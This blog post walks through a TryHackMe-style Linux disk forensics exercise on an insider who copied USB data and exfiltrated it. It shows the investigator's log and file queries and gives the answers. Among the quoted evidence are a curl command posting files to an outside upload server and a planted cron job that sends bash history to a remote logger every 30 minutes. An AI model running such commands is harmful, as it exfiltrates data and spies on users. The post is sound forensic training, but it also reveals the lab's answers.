---
layout: post
category:
    - linux
    - tryhackme.medium
---
<img src="assets/img/Linux_Disk_Imagev10.png" style="height: 200px;" alt="Disgruntled">

## Notes
- Liam's personal workstation's disk is mounted at `/mnt/liam_disk`
- The disk image is available at `/home/ubuntu`
- Autopsy is optional

### When did Liam last logged into the system? (Format: YYYY-MM-DD HH:MM:SS)
- `last -f /mnt/liam_disk/var/log/wtmp`
{% highlight diff linenos %}
liam     pts/1        192.168.147.1    Fri Feb 28 19:06 - 19:15  (00:08)
liam     tty2         tty2             Fri Feb 28 15:59    gone - no logout
liam     seat0        login screen     Fri Feb 28 15:59    gone - no logout
reboot   system boot  6.8.0-52-generic Fri Feb 28 15:58   still running
liam     tty2         tty2             Sat Feb  8 18:29 - 09:51 (19+15:22)
liam     seat0        login screen     Sat Feb  8 18:29 - crash (19+21:29)
reboot   system boot  6.8.0-52-generic Sat Feb  8 18:28   still running
{% endhighlight %}
- `cat var/log/auth.log | grep -ai -e "opened for user liam" -e "by liam" -e "gdm-password"`
{% highlight diff linenos %}
2025-02-08T18:29:00.870524+00:00 Liam-PC gdm-password]: gkr-pam: unable to locate daemon control file
2025-02-08T18:29:00.870605+00:00 Liam-PC gdm-password]: gkr-pam: stashed password to try later in open session
2025-02-08T18:29:00.887162+00:00 Liam-PC gdm-password]: pam_unix(gdm-password:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-08T18:29:00.954601+00:00 Liam-PC (systemd): pam_unix(systemd-user:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-08T18:29:01.416181+00:00 Liam-PC gdm-password]: gkr-pam: unlocked login keyring
2025-02-28T09:51:51.276564+00:00 Liam-PC gdm-password]: pam_unix(gdm-password:session): session closed for user liam
2025-02-28T10:59:07.256519-05:00 Liam-PC gdm-password]: gkr-pam: unable to locate daemon control file
2025-02-28T10:59:07.256580-05:00 Liam-PC gdm-password]: gkr-pam: stashed password to try later in open session
+2025-02-28T10:59:07.276136-05:00 Liam-PC gdm-password]: pam_unix(gdm-password:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-28T10:59:07.330584-05:00 Liam-PC (systemd): pam_unix(systemd-user:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-28T10:59:07.842292-05:00 Liam-PC gdm-password]: gkr-pam: unlocked login keyring
2025-02-28T11:07:21.993637-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T11:11:38.184125-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T11:11:42.310736-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T11:31:53.337656-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T11:41:05.968908-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T12:06:25.902199-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:04:22.702171-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:05:00.703323-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:05:15.129224-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:05:21.438798-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:06:13.175026-05:00 Liam-PC sshd[7640]: pam_unix(sshd:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-28T14:22:23.936230-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:25:56.235004-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-02-28T14:30:01.713290-05:00 Liam-PC CRON[8114]: pam_unix(cron:session): session opened for user liam(uid=1000) by liam(uid=0)
2025-02-28T14:37:52.598557-05:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
2025-03-19T09:07:41.979359-04:00 Liam-PC sudo: pam_unix(sudo:session): session opened for user root(uid=0) by liam(uid=1000)
{% endhighlight %}
### What was the timezone of liam's device? | `cat /mnt/liam_disk/etc/timezone`
{% highlight diff linenos %}
+America/Toronto
{% endhighlight %}
### What is the serial number of the USB that was inserted by Liam? | `grep -i -e "serialnumber:" syslog`
{% highlight diff linenos %}
2025-02-08T18:28:36.466819+00:00 Liam-PC kernel: usb usb1: SerialNumber: 0000:02:00.0
2025-02-08T18:28:36.466832+00:00 Liam-PC kernel: usb usb2: SerialNumber: 0000:02:03.0
2025-02-28T10:58:52.530854-05:00 Liam-PC kernel: usb usb1: SerialNumber: 0000:02:03.0
2025-02-28T10:58:52.530862-05:00 Liam-PC kernel: usb usb2: SerialNumber: 0000:02:00.0
+2025-02-28T10:59:25.473132-05:00 Liam-PC kernel: usb 1-1: SerialNumber: 2651931097993496666
{% endhighlight %}
### When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)
{% highlight diff linenos %}
+2025-02-28 10:59:25
{% endhighlight %}
### What command was executed when Liam ran 'transferfiles'? | `cat /mnt/liam_disk/home/liam/.bashrc`
{% highlight diff linenos %}
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
+alias transferfiles="cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data"
{% endhighlight %}
### What command did Liam execute to transfer the exfiltrated files to an external server? | `cat /mnt/liam_disk/home/liam/.bash_history`
{% highlight diff linenos %}
apt update
apt upgrade
lsusb
transferfiles 
set -o history
+curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
ls
ls -la
sudo ps aux
cd /Documents
ls
lsblk
sudo df -h
whoami
sudo ls -ld .hidden/ 
sudo nano mth
ls
ss -tulnp
{% endhighlight %}
### What is the IP address of the domain to which Liam transferred the files to? | `cat /mnt/liam_disk/etc/hosts`
{% highlight diff linenos %}
127.0.0.1 localhost
127.0.1.1 Liam-PC
+5.45.102.93 tehc-thm.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endhighlight %}
### Which directory was the user in when they created the file 'mth'? | `cat /mnt/liam_disk/home/liam/.bash_history`
{% highlight diff linenos %}
apt update
apt upgrade
lsusb
transferfiles 
set -o history
+curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
ls
ls -la
sudo ps aux
cd /Documents
ls
lsblk
sudo df -h
whoami
sudo ls -ld .hidden/ 
+sudo nano mth
ls
ss -tulnp
{% endhighlight %}
- `ls -l /mnt/liam_disk/home/liam/`
{% highlight diff linenos %}
total 40
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Desktop
drwxr-xr-x 3 ubuntu ubuntu 4096 Feb 28  2025 Documents
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Downloads
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Music
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Pictures
drwxr-xr-x 3 ubuntu ubuntu 4096 Feb 28  2025 Public
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Templates
drwxr-xr-x 2 ubuntu ubuntu 4096 Feb  8  2025 Videos
+-rw-r--r-- 1 root   root    128 Feb 28  2025 mth
drwx------ 4 ubuntu ubuntu 4096 Feb 28  2025 snap
{% endhighlight %}
### Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task? | `cat /home/liam/mth`
{% highlight diff linenos %}
Hi Henry,

+I hope you are doing well. As the work is now done, could you please transfer me the promised $10000?

Thanks 
Henry
{% endhighlight %}
### When was the USB disconnected by Liam? (Format: YYYY-MM-DD HH:MM:SS) | `grep -i -e "usb disconnect" syslog`
{% highlight diff linenos %}
+2025-02-28T11:44:00.456653-05:00 Liam-PC kernel: usb 1-1: USB disconnect, device number 2
{% endhighlight %}
### There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory? | `ls -la /mnt/liam_disk/home/liam/Public/`
{% highlight diff linenos %}
total 12
drwxr-xr-x  3 ubuntu ubuntu 4096 Feb 28  2025 .
drwxr-x--- 17 ubuntu ubuntu 4096 Feb 28  2025 ..
+drwxrwxr-x  2 ubuntu ubuntu 4096 Mar 19  2025 .hidden
{% endhighlight %}
### Which files are likely timstomped in this .hidden/ directory (answer in alphabetical order, ascending, separated by a comma. e.g example1.txt,example2.txt) | `ls -la /mnt/liam_disk/home/liam/Public/.hidden`
{% highlight diff linenos %}
total 8
drwxrwxr-x 2 ubuntu ubuntu 4096 Mar 19  2025 .
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file10.txt
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file9.txt
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file8.txt
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file6.txt
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file5.txt
-rw-rw-r-- 1 ubuntu ubuntu    0 Feb 28  2025 file4.txt
drwxr-xr-x 3 ubuntu ubuntu 4096 Feb 28  2025 ..
+-rw-rw-r-- 1 ubuntu ubuntu    0 Mar 12  2017 file3.txt
+-rw-rw-r-- 1 ubuntu ubuntu    0 Jan 16  2001 file7.txt
{% endhighlight %}
### Liam thought the work was done, but the external entity had other plans. Which IP address was connected via SSH to Liam's machine a few hours after the exfiltration? | `cat auth.log | grep -ia -e "sshd" | grep -ie "accepted"`
{% highlight diff linenos %}
+2025-02-28T14:06:13.170426-05:00 Liam-PC sshd[7640]: Accepted password for liam from 94.102.51.15 port 50974 ssh2
{% endhighlight %}
### Which cronjob did the external entity set up inside Liam's machine? | `cat /mnt/liam_disk/var/spool/cron/crontabs/liam`
{% highlight diff linenos %}
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.0DBY4b/crontab installed on Fri Feb 28 14:13:37 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

+*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php
{% endhighlight %}